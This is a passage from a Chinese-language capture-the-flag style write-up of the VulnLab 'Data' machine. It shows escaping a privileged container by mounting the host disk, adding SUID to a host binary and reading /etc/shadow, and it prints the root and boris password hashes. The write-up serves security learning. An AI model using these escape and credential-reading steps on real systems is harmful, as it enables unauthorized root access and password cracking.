+<p>只需要用特權挂載整個電腦的分區，就可以訪問裏面的任意内容，所以看一下有哪些磁盤：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022153-obke8r0.png" alt="image">​</p>
+<p>看到有 <code>/dev/xvda1</code>​，接下來就根據 hacktricks 創建目錄，挂在：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/grafana <span class="comment"># mkdir -p /mnt/hola</span></span><br><span class="line">/usr/share/grafana <span class="comment"># mount /dev/xvda1 /mnt/hola</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022243-24050h5.png" alt="image">​</p>
+<p>然後得到了 <code>root.txt</code>​ ，要獲得外部的shell，直接在挂在目錄的 <code>/bin</code>​文件裏面加上suid 即可：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022432-p66c0uk.png" alt="image">​</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/mnt/hola/etc <span class="comment"># cat shadow</span></span><br><span class="line">root:$6$.2oJh6nN<span class="variable">$ncuJSGDGDcl8lkFLPBwiiI1UApQgoJ6iJu5</span>/tdvQu.BB9AuDFvb/uURIPIYM4WV5D5I8/DE7CGx6S/ejdQlrU1:19015:0:99999:7:::</span><br><span class="line">daemon:*:18960:0:99999:7:::</span><br><span class="line">bin:*:18960:0:99999:7:::</span><br><span class="line">sys:*:18960:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:18960:0:99999:7:::</span><br><span class="line">games:*:18960:0:99999:7:::</span><br><span class="line">man:*:18960:0:99999:7:::</span><br><span class="line">lp:*:18960:0:99999:7:::</span><br><span class="line">mail:*:18960:0:99999:7:::</span><br><span class="line">news:*:18960:0:99999:7:::</span><br><span class="line">uucp:*:18960:0:99999:7:::</span><br><span class="line">proxy:*:18960:0:99999:7:::</span><br><span class="line">www-data:*:18960:0:99999:7:::</span><br><span class="line">backup:*:18960:0:99999:7:::</span><br><span class="line">list:*:18960:0:99999:7:::</span><br><span class="line">irc:*:18960:0:99999:7:::</span><br><span class="line">gnats:*:18960:0:99999:7:::</span><br><span class="line">nobody:*:18960:0:99999:7:::</span><br><span class="line">systemd-network:*:18960:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18960:0:99999:7:::</span><br><span class="line">syslog:*:18960:0:99999:7:::</span><br><span class="line">messagebus:*:18960:0:99999:7:::</span><br><span class="line">_apt:*:18960:0:99999:7:::</span><br><span class="line">lxd:*:18960:0:99999:7:::</span><br><span class="line">uuidd:*:18960:0:99999:7:::</span><br><span class="line">dnsmasq:*:18960:0:99999:7:::</span><br><span class="line">landscape:*:18960:0:99999:7:::</span><br><span class="line">sshd:*:18960:0:99999:7:::</span><br><span class="line">pollinate:*:18960:0:99999:7:::</span><br><span class="line">ubuntu:!:19015:0:99999:7:::</span><br><span class="line">boris:$6$Pz723G5s<span class="variable">$Iu87ypreSzwLFcbIsgk3</span>.Hla0lZ3/rdHnHpbGsLNw1exHfpRrWJ51M.PrpzAEqQl0ENSpXZrL5junY0t6Jgip.:19015:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&text=VulnLab - Machine - Data"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&title=VulnLab - Machine - Data"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&is_video=false&description=VulnLab - Machine - Data"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Data&body=Check out this article: https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&title=VulnLab - Machine - Data"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&title=VulnLab - Machine - Data"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&title=VulnLab - Machine - Data"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&title=VulnLab - Machine - Data"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&name=VulnLab - Machine - Data&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&t=VulnLab - Machine - Data"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
